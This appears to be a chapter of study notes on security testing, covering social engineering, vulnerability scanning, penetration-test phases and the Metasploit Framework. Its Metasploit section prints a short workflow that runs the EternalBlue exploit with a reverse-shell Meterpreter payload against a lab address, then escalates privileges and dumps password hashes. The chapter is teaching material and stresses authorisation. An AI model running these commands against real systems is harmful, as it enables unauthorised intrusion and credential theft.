# Chapter 12 — Testing Infrastructure

## 12.1 Overview

You don't know your controls work until you test them. Everything in this chapter exists to answer "is the thing we built actually holding?" — and the different methods answer genuinely different questions.

### The three that get confused

| Method | Question it answers | Output |
|---|---|---|
| **Vulnerability assessment** | What *might* be exploitable? | A prioritised list of weaknesses |
| **Penetration test** | What *is* exploitable, and how far can it go? | Proven attack chains with demonstrated impact |
| **Audit** | Are we doing what we said we'd do? | Compliance findings against a standard |

None of them substitutes for another. A clean vulnerability scan doesn't mean a pentester can't get in — scanners find pattern-matchable flaws and miss logic and chaining entirely (chapter 11.9). A clean audit means your paperwork matches your practice, which is not the same as being secure.

### Authorisation

The line that separates all of this from a criminal offence: **written authorisation, defining scope, timing and permitted techniques.** Same point as chapter 5.7, and it's not a formality — it's the entire legal basis for the work.

## 12.2 Social Engineering Attacks

Attacking the human. Still the most effective category that exists, because **there is no patch for a person** and a person can be persuaded to hand over what an attacker would otherwise have to steal.

### The principles it exploits

Good phishing pulls several of these at once, and recognising them is how you spot it:

* **Authority** - appears to come from someone with power to make the request. "This is the CFO."
* **Intimidation** - implied consequence. "There'll be a formal review if this isn't done today."
* **Consensus / social proof** - "everyone else on the team has already done this."
* **Scarcity** - limited quantity.
* **Urgency** - limited time. **Overwhelmingly the most common, because urgency is what stops people thinking.** Almost every phishing message has an artificial deadline, and it's there specifically to prevent the target pausing to verify.
* **Familiarity / liking** - rapport built first, or a known person impersonated.
* **Trust** - impersonating a trusted role, usually IT support.

### The techniques

* **Phishing** - mass fraudulent email. **Spear phishing** is targeted with researched detail. **Whaling** targets executives, who have both authority and — usually — exemption from the controls everyone else has.
* **Vishing** - voice. Increasingly **AI voice cloning**, which has broken the "I recognised their voice" verification people relied on.
* **Smishing** - SMS.
* **Pretexting** - inventing a scenario that justifies the request. The foundation under most of the others.
* **BEC (Business Email Compromise)** - a genuinely compromised mailbox or a convincing impersonation, used to redirect payments. **Financially the single most damaging category, well ahead of ransomware in total losses** — and it needs no malware at all.
* **Watering hole** - compromise a site the target group visits and wait. Used when the target itself is too hard to attack directly.
* **Typosquatting** and homoglyph domains.
* **Impersonation** and **brand impersonation**.
* **Pharming** - DNS-level redirection, so the correct URL reaches the attacker's site. Nastier than phishing because the address bar is right (chapter 11.1).
* **Misinformation / disinformation** - manipulating the information environment; disinformation is deliberate.
* **Shoulder surfing**, **dumpster diving**, **tailgating** - the physical variants (chapter 3.2).
* **Eliciting information** - extracting detail through apparently innocent conversation.
* **Invoice scams**, **credential harvesting** portals.

### Testing it

Simulated phishing campaigns measure and train. **The metric that matters is the report rate, not the click rate.** An organisation where people report quickly detects real campaigns fast. One that only punishes clicking teaches people to stay silent, which is worse than the click.

### Defence

Training and awareness · **verification through a separate channel** (the single most effective habit — if an email asks for a payment change, phone the person on a number you already had) · technical controls (DMARC/SPF/DKIM, external-sender banners, attachment sandboxing) · and a culture where challenging an unusual request is safe.

That last one outweighs the tooling. **If juniors are punished for questioning an executive's request, whaling will always work**, no matter how good the training content is. That's a management problem wearing a security costume.

## 12.3 Vulnerability Assessments

Systematic identification of weaknesses. Broad, automated, non-destructive — the opposite trade from pentesting.

### Types of scan

* **Credentialed** - authenticates to the host. Sees installed package versions, configuration and patch state. **Far more accurate, far fewer false positives.**
* **Non-credentialed** - sees what an unauthenticated outsider sees. Less detail, and it's the more realistic external view.

You want both, for different questions.

* **Network scan** - hosts, ports, services (chapter 5.7).
* **Application scan** - web app testing (chapter 11.8).
* **Host scan** - deep OS and configuration inspection.
* **Database scan**, **wireless scan**, **cloud posture scan**.

### Intrusive vs non-intrusive

* **Non-intrusive** - identifies the issue without exploiting it. Safe for production.
* **Intrusive** - actually attempts exploitation. Can crash services. Lab or explicitly-authorised only.

### Tools

**Nessus** (commercial, the standard), **OpenVAS/Greenbone** (open source counterpart), **Qualys** and **Rapid7 InsightVM** (cloud platforms), **Nuclei** (fast template-based), plus SCA tools for dependencies and CSPM for cloud configuration.

### Analysing the results

* **CVE** - the unique identifier for a specific vulnerability.
* **CVSS** - the 0–10 severity score. Base, temporal and environmental metrics.
* **CVSS is not risk.** This is the point that matters most. The score knows nothing about your environment — a CVSS 9.8 on an isolated internal test box with no data matters less than a 6.5 on an internet-facing payment gateway.

**Real prioritisation folds in:** exposure (internet-facing?), asset criticality, data sensitivity, whether a public exploit exists, and **whether it's being actively exploited in the wild** — CISA's **KEV (Known Exploited Vulnerabilities)** catalogue is the practical source for that last one and arguably the highest-signal input available.

This is chapter 1's `risk = likelihood × impact` applied at scale, and it's precisely the judgement my VAPT ranking agent is trying to encode — taking a flat list of findings and ordering it by what should actually be fixed first.

* **False positive** - reported but not real. Wastes effort and erodes trust in the tool.
* **False negative** - real but not reported. **Much more dangerous, and invisible by definition.**

### Response

**Remediate** (patch — the goal) · **mitigate** (reduce risk without fixing root cause, e.g. a WAF rule in front of a vulnerable app) · **transfer** · **accept** (documented, with an expiry date) · or mark as **false positive**. Same four options as chapter 1.4, applied per finding.

Then **rescan to validate**, and **report** — trend over time, mean time to remediate, open findings by severity. Reporting is what makes the programme visible to the people who fund it.

## 12.4 Penetration Testing

Authorised simulated attack. Where a vulnerability assessment lists weaknesses, a pentest **chains them together and proves impact**.

### Knowledge levels

* **Known environment (white box)** - full information: architecture, source, credentials. Efficient, deepest coverage, least realistic.
* **Partially known (grey box)** - some information, e.g. a standard user account. Good balance, and it models the very realistic "attacker who already phished one employee".
* **Unknown environment (black box)** - nothing given. Most realistic, and a large share of the budget goes on reconnaissance rather than testing.

### Team colours

* **Red team** - offensive.
* **Blue team** - defensive.
* **Purple team** - both working together deliberately, red attacking while blue watches and tunes detection in real time. **Far more valuable for actually improving** than a red team that wins quietly and hands over a report at the end.
* **White team** - referees, manage the exercise.

### The phases

1. **Planning and rules of engagement** - scope, timing, permitted techniques, escalation contacts, what's off-limits, handling of discovered data. **This document is what makes the engagement legal.**
2. **Reconnaissance**
   * **Passive** - OSINT, public records, DNS, certificate transparency logs, LinkedIn, job postings (which leak your tech stack), GitHub. **No contact with the target, undetectable.**
   * **Active** - scanning, enumeration, probing. Effective, and it touches the target and can be detected.
   Passive first, always — it costs nothing and burns no stealth.
3. **Scanning and enumeration** - services, versions, users, shares.
4. **Exploitation / gaining access** - the actual break-in.
5. **Post-exploitation** - **privilege escalation**, **persistence**, **lateral movement**, **pivoting** (using a compromised host as a route into networks you couldn't reach directly). This phase is where the real business impact gets demonstrated.
6. **Analysis and reporting** - findings, evidence, business impact, prioritised remediation. **The report is the deliverable**, not the shells.
7. **Cleanup** - remove tools, accounts, backdoors and artefacts.

### Related concepts

* **Bug bounty** - paying external researchers per finding. Continuous, diverse skill sets, pay-for-results — versus a point-in-time pentest with a fixed team.
* **Responsible disclosure** policy - a defined channel for researchers to report. Organisations without one get findings published instead.
* **Attestation** - the signed statement of what was tested and found, often required for compliance.
* **Exercise types** - **tabletop** (discussion), **simulation**, **full-scale**.

### Legal and ethical

Written authorisation from someone with authority to grant it · defined scope · out-of-scope systems genuinely left alone · handling rules for discovered sensitive data · and knowing that **cloud providers have their own pentest policies** you must comply with, since you don't own the underlying infrastructure.

## 12.5 The Metasploit Framework

An exploitation framework — a structured library of exploits, payloads and post-exploitation modules with consistent tooling around them.

### Structure

* **Exploit** - code taking advantage of a specific vulnerability.
* **Payload** - what runs after the exploit succeeds.
  * **Singles** - self-contained.
  * **Stagers/stages** - a small stager establishes a connection and pulls down a larger stage. Used because exploits often have tight size limits.
  * **Meterpreter** - the flagship payload. Runs **in memory**, never touching disk (fileless, chapter 6.1), and provides file access, keylogging, screenshots, pivoting and privilege escalation.
* **Auxiliary** - scanners, fuzzers, and non-exploit modules.
* **Post** - post-exploitation modules for enumeration and credential harvesting.
* **Encoders** - obfuscate payloads to evade signature detection.
* **NOPs** - padding.

### Basic workflow

```bash
msfconsole

search type:exploit platform:windows smb
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 192.168.56.101
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.1
check                    # verify vulnerability without exploiting, where supported
exploit

# once you have a session
sessions -l
sessions -i 1
sysinfo
getuid
getsystem                # attempt privilege escalation
hashdump
background
```

Supporting tools: **msfvenom** for standalone payload generation, and the database integration that lets you import Nmap results and track hosts and credentials across an engagement.

### Why it matters conceptually

Two things beyond "it's a hacking tool":

1. **It demonstrates that exploitation is commoditised.** A vulnerability with a public Metasploit module requires no exploit development skill — `use`, `set`, `exploit`. That's exactly why **"is there a public exploit?" is a prioritisation input** in 12.3, and why the window between patch release and mass exploitation keeps shrinking. Patch timelines have to assume the exploit is already automated.

2. **It's the canonical dual-use tool.** Identical capability, and the only thing separating a penetration tester from a criminal is authorisation. Same point as PowerShell in chapter 5.4 and Nmap in 5.7 — the tool has no ethics, the engagement letter does.

### From the defensive side

Metasploit traffic and Meterpreter behaviour are **well-signatured** by mature EDR and IDS, precisely because it's so widely used. Which is why real adversaries who care about stealth use custom tooling or commercial C2 (Cobalt Strike, Sliver) instead. So detecting Metasploit is table stakes — necessary, and no indication you'd catch a competent attacker.

**Metasploitable** is the intentionally vulnerable target VM for practising all of this legally.

---

## Chapter 12 — what I'd take away

* Vulnerability assessment says what *might* break; pentest proves what *does* and chains it; audit checks paperwork against practice. Three different questions.
* CVSS is severity, not risk. Exposure, asset criticality and active exploitation (KEV) are what turn a score into a priority.
* False negatives are worse than false positives and invisible by definition.
* Urgency is the social engineering lever that does the most work, because it prevents verification.
* Report rate beats click rate as a phishing metric — punishing clicks teaches silence.
* Passive recon first: free, and it burns no stealth.
* The pentest report is the deliverable, not the shells.
* Public exploit modules mean exploitation is commoditised — patch windows have to assume automation.
